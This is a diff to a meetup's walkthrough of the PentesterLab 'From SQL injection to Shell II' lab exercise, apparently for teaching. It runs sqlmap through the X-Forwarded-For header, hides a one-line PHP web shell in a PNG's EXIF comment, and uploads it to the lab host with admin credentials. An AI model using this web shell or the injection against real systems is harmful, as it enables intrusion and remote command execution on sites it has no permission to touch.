@@ -8,7 +8,7 @@ PentesterLab From SQL injection to Shell II
 
 This is to document the meetup’s efforts responding to the challenge `PentesterLab From SQL injection to Shell II <https://pentesterlab.com/exercises/from_sqli_to_shell_II//>`_ (the follow-on to `PentesterLab From SQL injection to Shell <https://pentesterlab.com/exercises/from_sqli_to_shell/>`_).
 
-There are numerous online articles helpful to understand SQL injection: `SQL Injection (OWASP) <https://www.owasp.org/index.php/SQL_Injection>`_, `SQL Injection Prevention Cheat Sheet (OWASP) <https://www.owasp.org/index.php/SQL_Injection_Prevention_Cheat_Sheet>`_, `SQL Injection Wiki`_, `What is an SQL Injection? SQL Injections: An Introduction (INFOSEC Institute) <http://resources.infosecinstitute.com/sql-injections-introduction/>`_, `SQL Injection (w3schools.com) <http://www.w3schools.com/sql/sql_injection.asp>`_, and `SQL Injection (HAKIPEDIA) <http://hakipedia.com/index.php/SQL_Injection>`_.
+There are numerous online articles helpful to understand SQL injection: `SQL Injection (OWASP) <https://www.owasp.org/index.php/SQL_Injection>`_, `SQL Injection Prevention Cheat Sheet (OWASP) <https://www.owasp.org/index.php/SQL_Injection_Prevention_Cheat_Sheet>`_, `What is an SQL Injection? SQL Injections: An Introduction (INFOSEC Institute) <http://resources.infosecinstitute.com/sql-injections-introduction/>`_, and `SQL Injection (w3schools.com) <http://www.w3schools.com/sql/sql_injection.asp>`_.
 
 For review of http headers and the http protocol, please consult :ref:`HTTP_vs_HTML` or start with `Wikipedia Hypertext Transfer Protocol <https://en.wikipedia.org/wiki/Hypertext_Transfer_Protocol>`_. `X-Forwarded-For <https://en.wikipedia.org/wiki/X-Forwarded-For>`_ focuses on the SQL injection target.
 
@@ -195,6 +195,7 @@ This is tedious and begs to be automated; `sqlmap`_ has done that. Give it a hin
 
 .. code-block:: console
 
+  hacker@kali:~$ rm -rf sqlmap
   hacker@kali:~$ sqlmap -u "http://$TARGET/" --headers="X-Forwarded-For: *" \
       --banner --batch --output-dir $PWD/sqlmap
   ###################### SNIP ######################
@@ -265,8 +266,9 @@ Consult the challenges documentation for issues about uploading files to an ngin
 
   hacker@kali:~$ TARGET=192.168.1.102
   hacker@kali:~$ curl --silent -o hacker.png http://$TARGET/admin/uploads/hacker.png
-  hacker@kali:~$ echo "<?php system(\$_GET['cmd']); ?>" > shell.php
+  hacker@kali:~$ echo -n "<?php system(\$_GET['cmd']); ?>" > shell.php
   hacker@kali:~$ exiftool "-comment<=shell.php" hacker.png
+  hacker@kali:~$ exiftool -comment hacker.png
   hacker@kali:~$ curl --silent --form action=index.php \
       --form title="shell" --form image="@hacker.png" --form category=1\
       --form Add="Add" --form user=admin --form password=P4ssw0rd \
